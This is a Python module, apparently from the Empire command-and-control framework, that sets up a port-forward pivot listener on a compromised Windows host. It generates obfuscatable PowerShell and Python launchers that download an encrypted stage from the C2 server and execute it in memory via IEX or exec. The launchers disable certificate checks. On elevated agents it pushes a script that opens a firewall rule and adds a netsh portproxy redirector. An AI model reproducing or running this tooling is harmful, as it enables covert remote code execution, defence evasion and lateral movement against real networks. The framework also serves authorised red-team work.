import base64
import copy
import logging
import os
import random

from empire.server.common import helpers, packets, templating
from empire.server.common.empire import MainMenu
from empire.server.core.db.base import SessionLocal
from empire.server.utils import data_util, listener_util

LOG_NAME_PREFIX = __name__
log = logging.getLogger(__name__)


class Listener:
    def __init__(self, mainMenu: MainMenu):
        self.info = {
            "Name": "port_forward_pivot",
            "Authors": [
                {
                    "Name": "Chris Ross",
                    "Handle": "@xorrior",
                    "Link": "https://twitter.com/xorrior",
                }
            ],
            "Description": (
                "Internal redirector listener. Active agent required. Listener options will be copied from another existing agent. Requires the active agent to be in an elevated context."
            ),
            # categories - client_server, peer_to_peer, broadcast, third_party
            "Category": ("peer_to_peer"),
            "Comments": [],
            "Software": "",
            "Techniques": [],
            "Tactics": [],
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            "Name": {
                "Description": "Name for the listener.",
                "Required": True,
                "Value": "port_forward_pivot",
            },
            "Agent": {
                "Description": "Agent to run port forwards pivot on.",
                "Required": True,
                "Value": "",
            },
            "internalIP": {
                "Description": "Uses internal IP of the agent by default.",
                "Required": False,
                "Value": "",
            },
            "ListenPort": {
                "Description": "Port for the agent to listen on.",
                "Required": True,
                "Value": 80,
            },
        }

        # required:
        self.mainMenu = mainMenu
        self.thread = None
        self.host_address = None

        self.instance_log = log

    def default_response(self):
        """
        If there's a default response expected from the server that the client needs to ignore,
        (i.e. a default HTTP page), put the generation here.
        """
        self.instance_log.info("default_response() not implemented for pivot listeners")
        return b""

    def validate_options(self) -> tuple[bool, str | None]:
        """
        Validate all options for this listener.
        """
        return True, None

    def generate_launcher(
        self,
        encode=True,
        obfuscate=False,
        obfuscation_command="",
        user_agent="default",
        proxy="default",
        proxy_creds="default",
        stager_retries="0",
        language=None,
        safe_checks="",
        listener_name=None,
        bypasses: list[str] | None = None,
    ):
        """
        Generate a basic launcher for the specified listener.
        """
        bypasses = [] if bypasses is None else bypasses

        if not language:
            log.error("listeners/template generate_launcher(): no language specified!")
            return None

        launcher = self.options["Launcher"]["Value"]
        stagingKey = self.options["StagingKey"]["Value"]
        profile = self.options["DefaultProfile"]["Value"]
        uris = list(profile.split("|")[0].split(","))
        stage0 = random.choice(uris)
        customHeaders = profile.split("|")[2:]

        if language == "powershell":
            stager = '$ErrorActionPreference = "SilentlyContinue";'
            if safe_checks.lower() == "true":
                stager = "If($PSVersionTable.PSVersion.Major -ge 3){"

                for bypass in bypasses:
                    stager += bypass
                stager += "};[System.Net.ServicePointManager]::Expect100Continue=0;"

            stager += "$wc=New-Object System.Net.WebClient;"

            if user_agent.lower() == "default":
                profile = self.options["DefaultProfile"]["Value"]
                user_agent = profile.split("|")[1]
            stager += f"$u='{user_agent}';"

            if "https" in self.host_address:
                # allow for self-signed certificates for https connections
                stager += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"

            if user_agent.lower() != "none" or proxy.lower() != "none":
                if user_agent.lower() != "none":
                    stager += "$wc.Headers.Add('User-Agent',$u);"

                if proxy.lower() != "none":
                    if proxy.lower() == "default":
                        stager += "$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;"

                    else:
                        # TODO: implement form for other proxy
                        stager += f"$proxy=New-Object Net.WebProxy('{proxy.lower()}');"
                        stager += "$wc.Proxy = $proxy;"

                    if proxy_creds.lower() == "default":
                        stager += "$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;"

                    else:
                        # TODO: implement form for other proxy credentials
                        username = proxy_creds.split(":")[0]
                        password = proxy_creds.split(":")[1]
                        if len(username.split("\\")) > 1:
                            usr = username.split("\\")[1]
                            domain = username.split("\\")[0]
                            stager += f"$netcred = New-Object System.Net.NetworkCredential('{usr}','{password}','{domain}');"

                        else:
                            usr = username.split("\\")[0]
                            stager += f"$netcred = New-Object System.Net.NetworkCredential('{usr}','{password}');"

                        stager += "$wc.Proxy.Credentials = $netcred;"

                    # save the proxy settings to use during the entire staging process and the agent
                    stager += "$Script:Proxy = $wc.Proxy;"

            # TODO: reimplement stager retries?
            # check if we're using IPv6

            # code to turn the key string into a byte array
            stager += f"$K=[System.Text.Encoding]::ASCII.GetBytes('{stagingKey}');"

            # prebuild the request routing packet for the launcher
            routingPacket = packets.build_routing_packet(
                stagingKey,
                sessionID="00000000",
                language="POWERSHELL",
                meta="STAGE0",
                additional="None",
                encData="",
            )
            b64RoutingPacket = base64.b64encode(routingPacket).decode("utf-8")

            # stager += "$ser="+helpers.obfuscate_call_home_address(host)+";$t='"+stage0+"';"
            stager += f"$ser={helpers.obfuscate_call_home_address(self.host_address)};$t='{stage0}';$hop='{listener_name}';"
            stager += "$wc.Headers.Add('Hop-Name',$hop);"

            # Add custom headers if any
            if customHeaders != []:
                for header in customHeaders:
                    headerKey = header.split(":")[0]
                    headerValue = header.split(":")[1]
                    # If host header defined, assume domain fronting is in use and add a call to the base URL first
                    # this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
                    if headerKey.lower() == "host":
                        stager += "try{$ig=$wc.DownloadData($ser)}catch{};"

                    stager += f'$wc.Headers.Add("{headerKey}","{headerValue}");'

            # add the routing packet to a cookie

            stager += f'$wc.Headers.Add("Cookie","session={b64RoutingPacket}");'
            stager += "$data=$wc.DownloadData($ser+$t);"
            stager += "$iv=$data[0..3];$data=$data[4..$data.length];"

            # decode everything and kick it over to IEX to kick off execution
            stager += "-join[Char[]](& $R $data ($IV+$K))|IEX"

            # Remove comments and make one line
            stager = helpers.strip_powershell_comments(stager)
            stager = data_util.ps_convert_to_oneliner(stager)

            if obfuscate:
                stager = self.mainMenu.obfuscationv2.obfuscate(
                    stager,
                    obfuscation_command=obfuscation_command,
                )

            # base64 encode the stager and return it
            if encode and (
                (not obfuscate) or ("launcher" not in obfuscation_command.lower())
            ):
                return helpers.powershell_launcher(stager, launcher)
            # otherwise return the case-randomized stager
            return stager

        if language.startswith("py"):
            # Python

            launcherBase = "import sys;"
            if "https" in self.host_address:
                # monkey patch ssl woohooo
                launcherBase += "import ssl;\nif hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;\n"

            try:
                if safe_checks.lower() == "true":
                    launcherBase += listener_util.python_safe_checks()
            except Exception as e:
                p = f"{listener_name}: Error setting LittleSnitch in stager: {e!s}"
                log.error(p, exc_info=True)

            if user_agent.lower() == "default":
                profile = self.options["DefaultProfile"]["Value"]
                user_agent = profile.split("|")[1]

            launcherBase += "import urllib.request;\n"
            launcherBase += f"UA='{user_agent}';"
            launcherBase += f"server='{self.host_address}';t='{stage0}';"

            # prebuild the request routing packet for the launcher
            routingPacket = packets.build_routing_packet(
                stagingKey,
                sessionID="00000000",
                language="PYTHON",
                meta="STAGE0",
                additional="None",
                encData="",
            )
            b64RoutingPacket = base64.b64encode(routingPacket).decode("utf-8")

            launcherBase += "req=urllib.request.Request(server+t);\n"
            # add the routing packet to a cookie
            launcherBase += "req.add_header('User-Agent',UA);\n"
            launcherBase += (
                f"req.add_header('Cookie',\"session={b64RoutingPacket}\");\n"
            )

            # Add custom headers if any
            if customHeaders != []:
                for header in customHeaders:
                    headerKey = header.split(":")[0]
                    headerValue = header.split(":")[1]
                    # launcherBase += ",\"%s\":\"%s\"" % (headerKey, headerValue)
                    launcherBase += f'req.add_header("{headerKey}","{headerValue}");\n'

            if proxy.lower() != "none":
                if proxy.lower() == "default":
                    launcherBase += "proxy = urllib.request.ProxyHandler();\n"
                else:
                    proto = proxy.split(":")[0]
                    launcherBase += (
                        "proxy = urllib.request.ProxyHandler({'"
                        + proto
                        + "':'"
                        + proxy
                        + "'});\n"
                    )

                if proxy_creds != "none":
                    if proxy_creds == "default":
                        launcherBase += "o = urllib.request.build_opener(proxy);\n"
                    else:
                        launcherBase += "proxy_auth_handler = urllib.request.ProxyBasicAuthHandler();\n"
                        username = proxy_creds.split(":")[0]
                        password = proxy_creds.split(":")[1]
                        launcherBase += (
                            "proxy_auth_handler.add_password(None,'"
                            + proxy
                            + "','"
                            + username
                            + "','"
                            + password
                            + "');\n"
                        )
                        launcherBase += "o = urllib.request.build_opener(proxy, proxy_auth_handler);\n"
                else:
                    launcherBase += "o = urllib.request.build_opener(proxy);\n"
            else:
                launcherBase += "o = urllib.request.build_opener();\n"

            # install proxy and creds globally, so they can be used with urlopen.
            launcherBase += "urllib.request.install_opener(o);\n"
            launcherBase += "data=urllib.request.urlopen(req).read();\n"

            # download the stager and extract the IV
            launcherBase += listener_util.python_extract_stager(stagingKey)

            if obfuscate:
                launcherBase = self.mainMenu.obfuscationv2.python_obfuscate(
                    launcherBase
                )
                launcherBase = self.mainMenu.obfuscationv2.obfuscate_keywords(
                    launcherBase
                )

            if encode:
                launchEncoded = base64.b64encode(launcherBase.encode("UTF-8")).decode(
                    "UTF-8"
                )
                return f"echo \"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('{launchEncoded}'));\" | python3 &"
            return launcherBase

        if language == "csharp":
            workingHours = self.options["WorkingHours"]["Value"]
            killDate = self.options["KillDate"]["Value"]
            customHeaders = profile.split("|")[2:]
            delay = self.options["DefaultDelay"]["Value"]
            jitter = self.options["DefaultJitter"]["Value"]
            lostLimit = self.options["DefaultLostLimit"]["Value"]

            with open(self.mainMenu.installPath + "/stagers/Sharpire.yaml", "rb") as f:
                stager_yaml = f.read()
            stager_yaml = stager_yaml.decode("UTF-8")
            stager_yaml = (
                stager_yaml.replace("{{ REPLACE_ADDRESS }}", self.host_address)
                .replace("{{ REPLACE_SESSIONKEY }}", stagingKey)
                .replace("{{ REPLACE_PROFILE }}", profile)
                .replace("{{ REPLACE_WORKINGHOURS }}", workingHours)
                .replace("{{ REPLACE_KILLDATE }}", killDate)
                .replace("{{ REPLACE_DELAY }}", str(delay))
                .replace("{{ REPLACE_JITTER }}", str(jitter))
                .replace("{{ REPLACE_LOSTLIMIT }}", str(lostLimit))
            )

            return self.mainMenu.dotnet_compiler.compile_stager(
                stager_yaml, "Sharpire", confuse=obfuscate
            )

        log.error(
            "listeners/template generate_launcher(): invalid language specification: only 'powershell' and 'python' are current supported for this module."
        )
        return None

    def generate_stager(
        self,
        listenerOptions,
        encode=False,
        encrypt=True,
        obfuscate=False,
        obfuscation_command="",
        language=None,
    ):
        """
        If you want to support staging for the listener module, generate_stager must be
        implemented to return the stage1 key-negotiation stager code.
        """
        if not language:
            log.error("listeners/http generate_stager(): no language specified!")
            return None

        profile = listenerOptions["DefaultProfile"]["Value"]
        uris = [a.strip("/") for a in profile.split("|")[0].split(",")]
        listenerOptions["Launcher"]["Value"]
        stagingKey = listenerOptions["StagingKey"]["Value"]
        workingHours = listenerOptions["WorkingHours"]["Value"]
        killDate = listenerOptions["KillDate"]["Value"]
        host = listenerOptions["Host"]["Value"]
        customHeaders = profile.split("|")[2:]

        # select some random URIs for staging from the main profile
        stage1 = random.choice(uris)
        stage2 = random.choice(uris)

        if language.lower() == "powershell":
            template_path = [
                os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
                os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
            ]

            eng = templating.TemplateEngine(template_path)
            template = eng.get_template("http/http.ps1")

            template_options = {
                "working_hours": workingHours,
                "kill_date": killDate,
                "staging_key": stagingKey,
                "profile": profile,
                "session_cookie": self.session_cookie,
                "host": host,
                "stage_1": stage1,
                "stage_2": stage2,
            }
            stager = template.render(template_options)

            # Patch in custom Headers
            remove = []
            if customHeaders != []:
                for key in customHeaders:
                    value = key.split(":")
                    if "cookie" in value[0].lower() and value[1]:
                        continue
                    remove += value
                headers = ",".join(remove)
                stager = stager.replace(
                    '$customHeaders = "";', f'$customHeaders = "{headers}";'
                )

            stagingKey = stagingKey.encode("UTF-8")
            stager = listener_util.remove_lines_comments(stager)

            if obfuscate:
                stager = self.mainMenu.obfuscationv2.obfuscate(
                    stager, obfuscation_command=obfuscation_command
                )
                stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)

            # base64 encode the stager and return it
            if encode:
                return helpers.enc_powershell(stager)

            return stager

        if language.lower() == "python":
            template_path = [
                os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
                os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
            ]

            eng = templating.TemplateEngine(template_path)
            template = eng.get_template("http/http.py")

            template_options = {
                "working_hours": workingHours,
                "kill_date": killDate,
                "staging_key": stagingKey,
                "profile": profile,
                "session_cookie": self.session_cookie,
                "host": host,
                "stage_1": stage1,
                "stage_2": stage2,
            }
            stager = template.render(template_options)

            if obfuscate:
                stager = self.mainMenu.obfuscationv2.python_obfuscate(stager)
                stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)

            # base64 encode the stager and return it
            if encode:
                return base64.b64encode(stager)

            return stager

        log.error(
            "listeners/http generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
        )
        return None

    def generate_agent(
        self,
        listenerOptions,
        language=None,
        obfuscate=False,
        obfuscation_command="",
        version="",
    ):
        """
        If you want to support staging for the listener module, generate_agent must be
        implemented to return the actual staged agent code.
        """
        if not language:
            log.error("listeners/http generate_agent(): no language specified!")
            return None

        language = language.lower()
        delay = listenerOptions["DefaultDelay"]["Value"]
        jitter = listenerOptions["DefaultJitter"]["Value"]
        profile = listenerOptions["DefaultProfile"]["Value"]
        lostLimit = listenerOptions["DefaultLostLimit"]["Value"]
        killDate = listenerOptions["KillDate"]["Value"]
        workingHours = listenerOptions["WorkingHours"]["Value"]
        b64DefaultResponse = base64.b64encode(self.default_response())

        if language == "powershell":
            with open(self.mainMenu.installPath + "/data/agent/agent.ps1") as f:
                code = f.read()

            # strip out comments and blank lines
            code = helpers.strip_powershell_comments(code)

            # patch in the delay, jitter, lost limit, and comms profile
            code = code.replace("$AgentDelay = 60", "$AgentDelay = " + str(delay))
            code = code.replace("$AgentJitter = 0", "$AgentJitter = " + str(jitter))
            code = code.replace(
                '$Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"',
                '$Profile = "' + str(profile) + '"',
            )
            code = code.replace("$LostLimit = 60", "$LostLimit = " + str(lostLimit))
            code = code.replace(
                '$DefaultResponse = ""',
                '$DefaultResponse = "' + str(b64DefaultResponse) + '"',
            )

            # patch in the killDate and workingHours if they're specified
            if killDate != "":
                code = code.replace(
                    "$KillDate,", "$KillDate = '" + str(killDate) + "',"
                )
            if obfuscate:
                code = self.mainMenu.obfuscationv2.obfuscate(
                    code,
                    obfuscation_command=obfuscation_command,
                )
                code = self.mainMenu.obfuscationv2.obfuscate_keywords(code)

            return code

        if language == "python":
            if version == "ironpython":
                f = self.mainMenu.installPath + "/data/agent/ironpython_agent.py"
            else:
                f = self.mainMenu.installPath + "/data/agent/agent.py"
            with open(f) as f:
                code = f.read()

            # strip out comments and blank lines
            code = helpers.strip_python_comments(code)

            # patch in the delay, jitter, lost limit, and comms profile
            code = code.replace("delay = 60", f"delay = {delay}")
            code = code.replace("jitter = 0.0", f"jitter = {jitter}")
            code = code.replace(
                'profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"',
                f'profile = "{profile}"',
            )
            code = code.replace("lostLimit = 60", f"lostLimit = {lostLimit}")
            code = code.replace(
                'defaultResponse = base64.b64decode("")',
                f'defaultResponse = base64.b64decode("{b64DefaultResponse}")',
            )

            # patch in the killDate and workingHours if they're specified
            if killDate != "":
                code = code.replace('killDate = ""', f'killDate = "{killDate}"')
            if workingHours != "":
                code = code.replace('workingHours = ""', f'workingHours = "{killDate}"')

            if obfuscate:
                code = self.mainMenu.obfuscationv2.python_obfuscate(code)
                code = self.mainMenu.obfuscationv2.obfuscate_keywords(code)
            return code
        if language == "csharp":
            # currently the agent is stageless so do nothing
            return ""

        log.error(
            "listeners/http generate_agent(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
        )
        return None

    def generate_comms(self, listenerOptions, language=None):
        """
        Generate just the agent communication code block needed for communications with this listener.
        This is so agents can easily be dynamically updated for the new listener.

        This should be implemented for the module.
        """
        if not language:
            log.error("listeners/http generate_comms(): no language specified!")
            return None

        if language.lower() == "powershell":
            template_path = [
                os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
                os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
            ]

            eng = templating.TemplateEngine(template_path)
            template = eng.get_template("http/http.ps1")

            template_options = {
                "session_cookie": self.session_cookie,
                "host": self.host_address,
            }

            return template.render(template_options)

        if language.lower() == "python":
            template_path = [
                os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
                os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
            ]
            eng = templating.TemplateEngine(template_path)
            template = eng.get_template("http/comms.py")

            template_options = {
                "session_cookie": self.session_cookie,
                "host": self.host_address,
            }

            return template.render(template_options)

        log.error(
            "listeners/http generate_comms(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
        )
        return None

    def start(self):
        """
        If a server component needs to be started, implement the kick off logic
        here and the actual server code in another function to facilitate threading
        (i.e. start_server() in the http listener).
        """
        name = self.options["Name"]["Value"]
        try:
            tempOptions = copy.deepcopy(self.options)
            with SessionLocal.begin() as db:
                agent = self.mainMenu.agentsv2.get_by_id(
                    db, self.options["Agent"]["Value"]
                )
                listenerName = agent.listener
                tempOptions["internalIP"]["Value"] = agent.internal_ip

                parent_listener = self.mainMenu.listenersv2.get_by_name(
                    db, listenerName
                )

                if parent_listener:
                    self.options = copy.deepcopy(parent_listener.options)
                    self.options["Name"]["Value"] = name
                else:
                    log.error("Parent listener not found")
                    return False

                # validate that the Listener does exist
                if not self.mainMenu.listenersv2.get_active_listener_by_name(
                    listenerName
                ):
                    log.error(f"{listenerName}: Listener does not exist")
                    return False

                # check if a listener for the agent already exists
                if self.mainMenu.listenersv2.get_active_listener_by_name(
                    tempOptions["Name"]["Value"]
                ):
                    log.error(
                        f"{listenerName}: Pivot listener already exists on agent {tempOptions['Name']['Value']}"
                    )
                    return False

                session_id = agent.session_id
                self.options["Agent"] = tempOptions["Agent"]
                if not agent or not agent.high_integrity:
                    log.error("Agent must be elevated to run a port forward pivot")
                    return False

                if agent.language.lower() in ["powershell", "csharp"]:
                    # logic for powershell agents
                    script = """
        function Invoke-Redirector {
            param($FirewallName, $ListenAddress, $ListenPort, $ConnectHost, [switch]$Reset, [switch]$ShowAll)
            if($ShowAll){
                $out = netsh interface portproxy show all
                if($out){
                    $out
                }
                else{
                    "[*] no redirectors currently configured"
                }
            }
            elseif($Reset){
                Netsh.exe advfirewall firewall del rule name="$FirewallName"
                $out = netsh interface portproxy reset
                if($out){
                    $out
                }
                else{
                    "[+] successfully removed all redirectors"
                }
            }
            else{
                if((-not $ListenPort)){
                    "[!] netsh error: required option not specified"
                }
                else{
                    $ConnectAddress = ""
                    $ConnectPort = ""

                    $parts = $ConnectHost -split(":")
                    if($parts.Length -eq 2){
                        # if the form is http[s]://HOST or HOST:PORT
                        if($parts[0].StartsWith("http")){
                            $ConnectAddress = $parts[1] -replace "//",""
                            if($parts[0] -eq "https"){
                                $ConnectPort = "443"
                            }
                            else{
                                $ConnectPort = "80"
                            }
                        }
                        else{
                            $ConnectAddress = $parts[0]
                            $ConnectPort = $parts[1]
                        }
                    }
                    elseif($parts.Length -eq 3){
                        # if the form is http[s]://HOST:PORT
                        $ConnectAddress = $parts[1] -replace "//",""
                        $ConnectPort = $parts[2]
                    }
                    if($ConnectPort -ne ""){
                        Netsh.exe advfirewall firewall add rule name=`"$FirewallName`" dir=in action=allow protocol=TCP localport=$ListenPort enable=yes
                        $out = netsh interface portproxy add v4tov4 listenaddress=$ListenAddress listenport=$ListenPort connectaddress=$ConnectAddress connectport=$ConnectPort protocol=tcp
                        if($out){
                            $out
                        }
                        else{
                            "[+] successfully added redirector on port $ListenPort to $ConnectHost"
                        }
                    }
                    else{
                        "[!] netsh error: host not in http[s]://HOST:[PORT] format"
                    }
                }
            }
        }
        Invoke-Redirector"""

                    script += " -ConnectHost {}".format(self.options["Host"]["Value"])
                    script += " -ConnectPort {}".format(self.options["Port"]["Value"])
                    script += " -ListenAddress {}".format(
                        tempOptions["internalIP"]["Value"]
                    )
                    script += " -ListenPort {}".format(
                        tempOptions["ListenPort"]["Value"]
                    )
                    script += f" -FirewallName {session_id}"

                    self.mainMenu.agenttasksv2.create_task_shell(db, agent, script)

                    msg = "Tasked agent to install Pivot listener "
                    self.mainMenu.agentsv2.save_agent_log(
                        tempOptions["Agent"]["Value"], msg
                    )

                    return True

                if agent.language.lower() == "python":
                    # not implemented
                    script = """
                    """

                    log.error("Python pivot listener not implemented")
                    return False

                log.error("Unable to determine the language for the agent")
        except Exception:
            log.error(f'Listener "{name}" failed to start')
            return False

    def shutdown(self):
        """
        If a server component was started, implement the logic that kills the particular
        named listener here.
        """
        name = self.options["Name"]["Value"]
        self.instance_log.info(f"{name}: shutting down...")
        log.info(f"{name}: shutting down...")

        with SessionLocal() as db:
            agent = self.mainMenu.agentsv2.get_by_name(db, name)

            if not agent or not agent.high_integrity:
                log.error("Agent is not present in the cache or not elevated")
                return

            if agent.language.startswith("po"):
                script = """
            function Invoke-Redirector {
                param($FirewallName, $ListenAddress, $ListenPort, $ConnectHost, [switch]$Reset, [switch]$ShowAll)
                if($ShowAll){
                    $out = netsh interface portproxy show all
                    if($out){
                        $out
                    }
                    else{
                        "[*] no redirectors currently configured"
                    }
                }
                elseif($Reset){
                    Netsh.exe advfirewall firewall del rule name="$FirewallName"
                    $out = netsh interface portproxy reset
                    if($out){
                        $out
                    }
                    else{
                        "[+] successfully removed all redirectors"
                    }
                }
                else{
                    if((-not $ListenPort)){
                        "[!] netsh error: required option not specified"
                    }
                    else{
                        $ConnectAddress = ""
                        $ConnectPort = ""

                            $parts = $ConnectHost -split(":")
                            if($parts.Length -eq 2){
                                # if the form is http[s]://HOST or HOST:PORT
                                if($parts[0].StartsWith("http")){
                                    $ConnectAddress = $parts[1] -replace "//",""
                                    if($parts[0] -eq "https"){
                                        $ConnectPort = "443"
                                    }
                                    else{
                                        $ConnectPort = "80"
                                    }
                                }
                                else{
                                    $ConnectAddress = $parts[0]
                                    $ConnectPort = $parts[1]
                                }
                            }
                            elseif($parts.Length -eq 3){
                                # if the form is http[s]://HOST:PORT
                                $ConnectAddress = $parts[1] -replace "//",""
                                $ConnectPort = $parts[2]
                            }
                            if($ConnectPort -ne ""){
                                Netsh.exe advfirewall firewall add rule name=`"$FirewallName`" dir=in action=allow protocol=TCP localport=$ListenPort enable=yes
                                $out = netsh interface portproxy add v4tov4 listenaddress=$ListenAddress listenport=$ListenPort connectaddress=$ConnectAddress connectport=$ConnectPort protocol=tcp
                                if($out){
                                    $out
                                }
                                else{
                                    "[+] successfully added redirector on port $ListenPort to $ConnectHost"
                                }
                            }
                            else{
                                "[!] netsh error: host not in http[s]://HOST:[PORT] format"
                            }
                        }
                    }
                }
                Invoke-Redirector"""

                script += " -Reset"
                script += f" -FirewallName {agent.session_id}"

                self.mainMenu.agenttasksv2.create_task_shell(db, agent, script)
                msg = "Tasked agent to uninstall Pivot listener "
                self.mainMenu.agentsv2.save_agent_log(agent.session_id, msg)

            elif agent.language.startswith("py"):
                log.error("Shutdown not implemented for python")
